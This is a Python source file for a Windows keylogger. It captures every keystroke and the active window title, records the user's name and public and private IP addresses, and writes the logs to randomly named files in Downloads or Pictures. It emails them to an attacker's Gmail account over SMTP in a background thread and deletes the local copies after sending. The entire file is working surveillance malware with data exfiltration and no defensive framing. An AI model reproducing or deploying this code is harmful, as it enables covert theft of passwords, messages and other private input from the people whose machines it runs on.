import os
import time
import requests
import socket
import random
import smtplib
import threading
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32gui

class Keylogger:
    def __init__(self):
        self.logged_data = []
        self.user = os.getlogin()
        self.public_ip = requests.get('https://api.ipify.org/').text
        self.private_ip = socket.gethostbyname(socket.gethostname())
        self.old_app = ''
        self.delete_files = []

    def on_press(self, key):
        active_app = self.get_active_window_title()
        
        if active_app != self.old_app and active_app:
            self.logged_data.append(f'[{self.get_current_datetime()}] ~ {active_app}\n')
            self.old_app = active_app
        
        key_str = self.key_to_string(key)
        self.logged_data.append(key_str)

    def get_active_window_title(self):
        window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        return 'Windows Start Menu' if window_title == 'Cortana' else window_title

    def get_current_datetime(self):
        return time.ctime()

    def key_to_string(self, key):
        if hasattr(key, 'char'):
            return key.char
        elif key in [Key.enter, Key.space, Key.tab, Key.shift, Key.ctrl_l, Key.alt_l]:
            return f'[{key}]'
        elif key == Key.backspace:
            return '[BACKSPACE]'
        elif key == Key.delete:
            return '[DEL]'
        elif key == Key.left:
            return '[LEFT ARROW]'
        elif key == Key.right:
            return '[RIGHT ARROW]'
        else:
            return str(key)

    def write_to_file(self, count):
        directories = [os.path.expanduser('~') + '/Downloads/', os.path.expanduser('~') + '/Pictures/']
        filepath = random.choice(directories)
        filename = f'{count}I{random.randint(1000000, 9999999)}.txt'
        file_path = os.path.join(filepath, filename)
        self.delete_files.append(file_path)
        
        with open(file_path, 'w') as file:
            file.writelines(self.logged_data)

    def send_logs(self):
        count = 0
        while True:
            if len(self.logged_data) > 1:
                try:
                    self.write_to_file(count)
                    subject = f'[{self.user}] ~ {count}'
                    
                    msg = MIMEMultipart()
                    msg['From'] = ''
                    msg['To'] = ''
                    msg['Subject'] = subject
                    body = 'Testing'
                    msg.attach(MIMEText(body, 'plain'))

                    attachment = open(self.delete_files[0], 'rb')
                    filename = os.path.basename(self.delete_files[0])
                    
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={filename}')
                    msg.attach(part)

                    text = msg.as_string()
                    
                    with smtplib.SMTP('smtp.gmail.com', 587) as s:
                        s.starttls()
                        s.login(config.fromAddr, config.fromPswd)
                        s.sendmail(config.fromAddr, config.fromAddr, text)
                    
                    attachment.close()
                    os.remove(self.delete_files[0])
                    del self.logged_data[1:]
                    del self.delete_files[0:]
                    count += 1
                except Exception as errorString:
                    print(f'[!] send_logs // Error: {errorString}')
                    pass

    def start(self):
        T1 = threading.Thread(target=self.send_logs)
        T1.start()
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()
